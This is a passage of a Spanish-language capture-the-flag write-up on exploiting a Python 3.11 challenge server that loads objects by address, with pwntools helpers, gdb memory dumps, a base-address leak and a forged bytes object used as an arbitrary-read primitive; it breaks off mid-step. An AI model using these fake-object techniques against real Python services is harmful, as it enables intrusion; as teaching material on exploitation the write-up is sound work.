<span class="code-dark-blue">0x7ffff70decf0</span>:	0x0000000000000000	0x0000000000000000
</code></pre></div><h3 id="_fake-objects_"><em>Fake objects</em></h3><p>Al leer <a target="_blank" href="https://pwn.win/2022/05/11/python-buffered-reader.html"><em>Exploiting a Use-After-Free for code execution in every version of Python 3</em></a>, entendí que para explotar una aplicación de Python, una forma es crear <em>fake objects</em> en la memoria para confundir a Python (similar a un <em>exploit</em> de navegador en JavaScript).</p><p>Hay dos estructuras similares que se mencionan en <a target="_blank" href="https://pwn.win/2022/05/11/python-buffered-reader.html">el artículo</a>: <code>bytearray</code> y <code>bytes</code>.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; x = bytearray([1, 2, 3, 4, 5])  
&gt;&gt;&gt; id(x)
140737338225200
&gt;&gt;&gt; y = bytes([1, 2, 3, 4, 5])
&gt;&gt;&gt; id(y)
140737338064160
</code></pre></div><p>Se comportan así en la memoria:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyObject *) 140737338064160
$17 = {
  ob_refcnt = 0x1,
  ob_type = <span class="code-dark-blue">0x5555559cbac0</span> &lt;<span class="code-dark-yellow">PyBytes_Type</span>&gt;
}
<span class="code-green">gef➤  </span>p *(PyBytesObject *) 140737338064160
$18 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = <span class="code-dark-blue">0x5555559cbac0</span> &lt;<span class="code-dark-yellow">PyBytes_Type</span>&gt;
    },
    ob_size = 0x5
  },
  ob_shash = 0xffffffffffffffff,
  ob_sval = "\001"
}
<span class="code-green">gef➤  </span>p *(PyObject *) 140737338225200
$19 = {
  ob_refcnt = 0x1,
  ob_type = <span class="code-dark-blue">0x5555559cac60</span> &lt;<span class="code-dark-yellow">PyByteArray_Type</span>&gt;
}
<span class="code-green">gef➤  </span>p *(PyByteArrayObject *) 140737338225200
$20 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = <span class="code-dark-blue">0x5555559cac60</span> &lt;<span class="code-dark-yellow">PyByteArray_Type</span>&gt;
    },
    ob_size = 0x5
  },
  ob_alloc = 0x6,
  ob_bytes = <span class="code-dark-blue">0x7ffff73d85f0</span> "\001\002\003\004\005",  
  ob_start = <span class="code-dark-blue">0x7ffff73d85f0</span> "\001\002\003\004\005",
  ob_exports = 0x0
}
</code></pre></div><p>La diferencia entre los objetos <code>bytearray</code> y <code>bytes</code> es que el primero es mutable, mientras que el segundo es inmutable. Obsérvese que ambos tienen un campo llamado <code>ob_size</code> que indica la longitud del objeto.</p><p>El programa nos permite mostrar estos objetos con la opción <code>2</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; load('140737338225200')
bytearray(b'\x01\x02\x03\x04\x05')  
&gt;&gt;&gt; load('140737338064160')
b'\x01\x02\x03\x04\x05'
</code></pre></div><p>Con todo este conocimiento, comencemos con el <em>exploit</em>.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Usaré estas funciones auxiliares:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">add</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">inp</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">int</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Selection:'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'To Add:'</span><span class="mtk1">, </span><span class="mtk9 mtki">inp</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">.recvline().decode())</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">remove</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">addr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Selection:'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'To Remove:'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">load</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">, </span><span class="mtk9 mtki">addr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">do_recv</span><span class="mtk1">: </span><span class="mtk8 mtku">bool</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">True</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Selection:'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk9 mtki">p</span><span class="mtk1">.sendlineafter(</span><span class="mtk7 mtki">b</span><span class="mtk4">'To Load:'</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">p</span><span class="mtk1">.recvline() </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk9 mtki">do_recv</span><span class="mtk1"> </span><span class="mtk5">else</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span>
</code></pre></div><p>En primer lugar, el programa nos da una fuga de memoria del <code>int</code> con valor <code>0</code> (también podríamos haber usado la dirección de <code>'a'</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; id(0)
93824997988328  
</code></pre></div><p>Y esta dirección está dentro del binario, por lo que podemos obtener el <em>offset</em> y encontrar la dirección base del binario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>vmmap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-green">Heap</span> | <span class="code-dark-magenta">Stack</span> ]
<span class="code-dark-blue">Start              End                Offset             Perm Path</span>
0x0000555555554000 0x0000555555641000 0x0000000000000000 r-- /usr/local/bin/python3.11
<span class="code-dark-red">0x0000555555641000</span> <span class="code-dark-red">0x00005555558b5000</span> <span class="code-dark-red">0x00000000000ed000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/local/bin/python3.11</span>
0x00005555558b5000 0x000055555599b000 0x0000000000361000 r-- /usr/local/bin/python3.11
0x000055555599b000 0x00005555559ca000 0x0000000000446000 r-- /usr/local/bin/python3.11
0x00005555559ca000 0x0000555555afa000 0x0000000000475000 rw- /usr/local/bin/python3.11
<span class="code-dark-green">0x0000555555afa000</span> <span class="code-dark-green">0x0000555555ca3000</span> <span class="code-dark-green">0x0000000000000000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">[heap]</span>
0x00007ffff6ff3000 0x00007ffff6ff5000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
<span class="code-dark-red">0x00007ffff6ff5000</span> <span class="code-dark-red">0x00007ffff6ffb000</span> <span class="code-dark-red">0x0000000000002000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/lib/x86_64-linux-gnu/libffi.so.7.1.0</span>
0x00007ffff6ffb000 0x00007ffff6ffc000 0x0000000000008000 r-- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff6ffc000 0x00007ffff6ffd000 0x0000000000009000 --- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff6ffd000 0x00007ffff6ffe000 0x0000000000009000 r-- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff6ffe000 0x00007ffff6fff000 0x000000000000a000 rw- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0
0x00007ffff6fff000 0x00007ffff7006000 0x0000000000000000 r-- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so  
<span class="code-dark-red">0x00007ffff7006000</span> <span class="code-dark-red">0x00007ffff7017000</span> <span class="code-dark-red">0x0000000000007000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so</span>
0x00007ffff7017000 0x00007ffff701d000 0x0000000000018000 r-- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so
0x00007ffff701d000 0x00007ffff701e000 0x000000000001d000 r-- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so
0x00007ffff701e000 0x00007ffff7022000 0x000000000001e000 rw- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so
0x00007ffff7022000 0x00007ffff7155000 0x0000000000000000 rw-
0x00007ffff7155000 0x00007ffff7163000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libtinfo.so.6.2
...
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
<span class="code-dark-magenta">0x00007ffffffde000</span> <span class="code-dark-magenta">0x00007ffffffff000</span> <span class="code-dark-magenta">0x0000000000000000</span> <span class="code-dark-magenta">rw-</span> <span class="code-dark-magenta">[stack]</span>
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
<span class="code-green">gef➤  </span>p/x 93824997988328
$21 = 0x555555ad17e8
<span class="code-green">gef➤  </span>p/d 0x555555ad17e8 - 0x0000555555554000
$22 = 5756904
</code></pre></div><p>Entonces, podemos usar este código:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">process</span><span class="mtk1">([</span><span class="mtk4">'python3.11'</span><span class="mtk1">, </span><span class="mtk4">'challenge/server.py'</span><span class="mtk1">], </span><span class="mtk9 mtki">level</span><span class="mtk5">=</span><span class="mtk4">'DEBUG'</span>)  
<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Zero: '</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">zero_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'id(0) = </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">zero_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">python_base_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">zero_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">5756904</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Python base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">python_base_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span>()
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-green">+</span>] Starting local process '/usr/local/bin/python3.11' argv=[b'python3.11', b'challenge/server.py'] : pid 737816
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', '/usr/local/bin/python3.11', '737816', '-x', '/tmp/pwnpwdk5bfs.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-red">DEBUG</span>] Received 0x54 bytes:
    b'Zero: 94128788563944\n'
    b'0) Add To Store\n'
    b'1) Remove From Store\n'
    b'2) Load Address\n'
    b'Selection:'
[<span class="code-blue">*</span>] id(0) = 0x559c110167e8
[<span class="code-green">+</span>] Python base address: 0x559c10a99000
[<span class="code-blue">*</span>] Switching to interactive mode
1) Add To Store
2) Remove From Store
3) Load Address
Selection:<span class="code-red">$</span>
</code></pre></div><p>Y la dirección base del binario se ve correcta:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>vmmap
[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-green">Heap</span> | <span class="code-dark-magenta">Stack</span> ]
<span class="code-dark-blue">Start              End                Offset             Perm Path</span>
0x0000559c10a99000 0x0000559c10b86000 0x0000000000000000 r-- /usr/local/bin/python3.11
<span class="code-dark-red">0x0000559c10b86000</span> <span class="code-dark-red">0x0000559c10dfa000</span> <span class="code-dark-red">0x00000000000ed000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/local/bin/python3.11</span>
0x0000559c10dfa000 0x0000559c10ee0000 0x0000000000361000 r-- /usr/local/bin/python3.11
0x0000559c10ee0000 0x0000559c10f0f000 0x0000000000446000 r-- /usr/local/bin/python3.11
0x0000559c10f0f000 0x0000559c1103f000 0x0000000000475000 rw- /usr/local/bin/python3.11
0x0000559c1103f000 0x0000559c11082000 0x0000000000000000 rw-
<span class="code-dark-green">0x0000559c12df3000</span> <span class="code-dark-green">0x0000559c12e8e000</span> <span class="code-dark-green">0x0000000000000000</span> <span class="code-dark-green">rw-</span> <span class="code-dark-green">[heap]</span>
0x00007fc6f92e5000 0x00007fc6f92ec000 0x0000000000000000 r-- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so  
<span class="code-dark-red">0x00007fc6f92ec000</span> <span class="code-dark-red">0x00007fc6f92fd000</span> <span class="code-dark-red">0x0000000000007000</span> <span class="code-dark-red">r-x</span> <span class="code-dark-red">/usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so</span>
0x00007fc6f92fd000 0x00007fc6f9303000 0x0000000000018000 r-- /usr/local/lib/python3.11/lib-dynload/_ctypes.cpython-311-x86_64-linux-gnu.so
...
</code></pre></div><h3 id="fugando-direcciones-de-memoria">Fugando direcciones de memoria</h3><p>Esta parte no es realmente necesaria para el <em>exploit</em>, pero es interesante.</p><p>Volvamos por un momento a <code>test.py</code> y el objeto <code>bytes</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q python3.11
Reading symbols from <span class="code-dark-green">python3.11</span>...
<span class="code-red">gef➤  </span>run -i test.py
Starting program: /usr/local/bin/python3.11 -i test.py
[Thread debugging using libthread_db enabled]
Using host libthread_db library "<span class="code-dark-green">/lib/x86_64-linux-gnu/libthread_db.so.1</span>".  
Zero: 93824997988328
&gt;&gt;&gt; x = bytes([1, 2, 3, 4, 5])
&gt;&gt;&gt; id(x)
140737338006704
&gt;&gt;&gt; load('140737338006704')
b'\x01\x02\x03\x04\x05'
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>p *(PyBytesObject *) 140737338006704
$1 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = <span class="code-dark-blue">0x5555559cbac0</span> &lt;<span class="code-dark-yellow">PyBytes_Type</span>&gt;
    },
    ob_size = 0x5
  },
  ob_shash = 0xffffffffffffffff,
  ob_sval = "\001"
}
<span class="code-green">gef➤  </span>x/30gx 140737338006704
<span class="code-dark-blue">0x7ffff709dcb0</span>: 0x0000000000000001      0x00005555559cbac0  
<span class="code-dark-blue">0x7ffff709dcc0</span>: 0x0000000000000005      0xffffffffffffffff
<span class="code-dark-blue">0x7ffff709dcd0</span>: 0x0000000504030201      0x0000000000000000
<span class="code-dark-blue">0x7ffff709dce0</span>: 0x00007ffff709f870      0x00007ffff70aef10
<span class="code-dark-blue">0x7ffff709dcf0</span>: 0x0000000000000001      0x00005555559e1c60
<span class="code-dark-blue">0x7ffff709dd00</span>: 0x0000000000000001      0x0000555555b7e020
<span class="code-dark-blue">0x7ffff709dd10</span>: 0x00007ffff709e460      0x00007ffff709dd40
<span class="code-dark-blue">0x7ffff709dd20</span>: 0x0000000000000001      0x00005555559efd40
<span class="code-dark-blue">0x7ffff709dd30</span>: 0x0000000000000002      0x00007ffff726fe60
<span class="code-dark-blue">0x7ffff709dd40</span>: 0x00007ffff709dd10      0x0000555555adfd78
<span class="code-dark-blue">0x7ffff709dd50</span>: 0x0000000000000001      0x00005555559efd40
<span class="code-dark-blue">0x7ffff709dd60</span>: 0x0000000000000001      0x00007ffff7284260
<span class="code-dark-blue">0x7ffff709dd70</span>: 0x00007ffff709dda0      0x00007ffff709dc80
<span class="code-dark-blue">0x7ffff709dd80</span>: 0x0000000000000001      0x00005555559efd40
<span class="code-dark-blue">0x7ffff709dd90</span>: 0x0000000000000001      0x00007ffff7284260
</code></pre></div><p>Como se puede ver, los datos reales aparecen en la dirección <code>0x7ffff709dcd0</code> (<code>0x0000000504030201</code>). Después de eso, tenemos muchas direcciones de memoria (de <code>_ctypes</code>). ¿Qué pasa si modificamos la memoria y establecemos un tamaño más grande?</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>set *0x7ffff709dcc0 = 0xf0
<span class="code-green">gef➤  </span>p *(PyBytesObject *) 140737338006704
$2 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = <span class="code-dark-blue">0x5555559cbac0</span> &lt;<span class="code-dark-yellow">PyBytes_Type</span>&gt;
    },
    ob_size = 0xf0
  },
  ob_shash = 0xffffffffffffffff,
  ob_sval = "\001"
}
<span class="code-green">gef➤  </span>continue
Continuing.

&gt;&gt;&gt; load('140737338006704')
b'\x01\x02\x03\x04\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00p\xf8\t\xf7\xff\x7f\x00\x00\x10\xef\n\xf7\xff\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00`\x1c\x9eUUU\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00 \xe0\xb7UUU\x00\x00`\xe4\t\xf7\xff\x7f\x00\x00@\xdd\t\xf7\xff\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00@\xfd\x9eUUU\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00`\xfe&\xf7\xff\x7f\x00\x00\x10\xdd\t\xf7\xff\x7f\x00\x00x\xfd\xadUUU\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00@\xfd\x9eUUU\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00`B(\xf7\xff\x7f\x00\x00\xa0\xdd\t\xf7\xff\x7f\x00\x00\x80\xdc\t\xf7\xff\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00@\xfd\x9eUUU\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00`B(\xf7\xff\x7f\x00\x00P\xdf\t\xf7\xff\x7f\x00\x00p\xdd\t\xf7\xff\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00@\xfd\x9eUUU\x00\x00'  
</code></pre></div><p>¿Increíble, no? Ahora debemos averiguar si podemos obtener esta primitiva de lectura en el programa.</p><p>Intentemos agregar una cadena grande:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; add('AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHH')  
140737339460016
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/30gx 140737339460016
<span class="code-dark-blue">0x7ffff72009b0</span>: 0x0000000000000001      0x00005555559e51a0  
<span class="code-dark-blue">0x7ffff72009c0</span>: 0x0000000000000040      0x7fedcbdbbb64ace9
<span class="code-dark-blue">0x7ffff72009d0</span>: 0x0000555555adb4e5      0x0000000000000000
<span class="code-dark-blue">0x7ffff72009e0</span>: 0x4141414141414141      0x4242424242424242
<span class="code-dark-blue">0x7ffff72009f0</span>: 0x4343434343434343      0x4444444444444444
<span class="code-dark-blue">0x7ffff7200a00</span>: 0x4545454545454545      0x4646464646464646
<span class="code-dark-blue">0x7ffff7200a10</span>: 0x4747474747474747      0x4848484848484848
<span class="code-dark-blue">0x7ffff7200a20</span>: 0x0a29274848484800      0x0000000000000000
<span class="code-dark-blue">0x7ffff7200a30</span>: 0x0000000000000001      0x0000000000010303
<span class="code-dark-blue">0x7ffff7200a40</span>: 0x0000000000000004      0x0000000000000001
<span class="code-dark-blue">0x7ffff7200a50</span>: 0xffffffff00ffffff      0x0000555555ada9a0
<span class="code-dark-blue">0x7ffff7200a60</span>: 0x00007ffff709abb0      0x0000000000000000
<span class="code-dark-blue">0x7ffff7200a70</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffff7200a80</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffff7200a90</span>: 0x0000000000000000      0x0000000000000000
</code></pre></div><p>¿Puedes adivinar el siguiente paso? Vamos a ingresar a un <em>fake object</em> en el <em>buffer</em> del objeto <code>str</code> y decirle al programa que lo cargue con <code>PyObj_FromPtr</code>. Mantengamos el enfoque en el objeto <code>bytes</code> anterior:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/10gx 140737338006704
<span class="code-dark-blue">0x7ffff709dcb0</span>: 0x0000000000000001      0x00005555559cbac0  
<span class="code-dark-blue">0x7ffff709dcc0</span>: 0x0000000000000005      0xffffffffffffffff
<span class="code-dark-blue">0x7ffff709dcd0</span>: 0x0000000504030201      0x0000000000000000
<span class="code-dark-blue">0x7ffff709dce0</span>: 0x00007ffff709f870      0x00007ffff70aef10
</code></pre></div><p>Ahora metemos un <em>fake object</em> de tipo <code>bytes</code> en <code>storage</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; add('\x01\0\0\0\0\0\0\0\xc0\xba\x9c\x55\x55\x55\0\0\xf0\0\0\0\0\0\0\0\xff\xff\xff\xff\xff\xff\xff\xff')  
140737338229456
&gt;&gt;&gt; load('140737338229456')
ÀºUUUðÿÿÿÿÿÿÿÿ
</code></pre></div><p>Y tenemos esto en la memoria:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/30gx 140737338229456
<span class="code-dark-blue">0x7ffff70d42d0</span>: 0x0000000000000001      0x00005555559e51a0  
<span class="code-dark-blue">0x7ffff70d42e0</span>: 0x0000000000000020      0xa6753be1cbf2463d
<span class="code-dark-blue">0x7ffff70d42f0</span>: 0x00640053006400a4      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d4300</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d4310</span>: 0x0000000000000000      0x0000000000000001
<span class="code-dark-blue">0x7ffff70d4320</span>: 0x00005555559cbac0      0x00000000000000f0
<span class="code-dark-blue">0x7ffff70d4330</span>: 0xffffffffffffffff      0x0000000079702e00
<span class="code-dark-blue">0x7ffff70d4340</span>: 0x00007ffff70d43b0      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d4350</span>: 0x0000000000000000      0x00005555559d2ea0
<span class="code-dark-blue">0x7ffff70d4360</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d4370</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d4380</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d4390</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d43a0</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d43b0</span>: 0x00007ffff70d4420      0x00005555559e51a0
</code></pre></div><p>Observe que el <em>fake object</em> <code>bytes</code> aparece en el <em>offset</em> <code>0x48</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/10gx 140737338229456 + 0x48
<span class="code-dark-blue">0x7ffff70d4318</span>: 0x0000000000000001      0x00005555559cbac0  
<span class="code-dark-blue">0x7ffff70d4328</span>: 0x00000000000000f0      0xffffffffffffffff
<span class="code-dark-blue">0x7ffff70d4338</span>: 0x0000000079702e00      0x00007ffff70d43b0
<span class="code-dark-blue">0x7ffff70d4348</span>: 0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x7ffff70d4358</span>: 0x00005555559d2ea0      0x0000000000000000
<span class="code-green">gef➤  </span>p *(PyBytesObject *) (140737338229456 + 0x48)
$3 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 0x1,
      ob_type = <span class="code-dark-blue">0x5555559cbac0</span> &lt;<span class="code-dark-yellow">PyBytes_Type</span>&gt;
    },
    ob_size = 0xf0
  },
  ob_shash = 0xffffffffffffffff,
  ob_sval = ""
}
</code></pre></div><p>Y así podemos cargarlo en el programa:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; show(str(140737338229456 + 0x48))
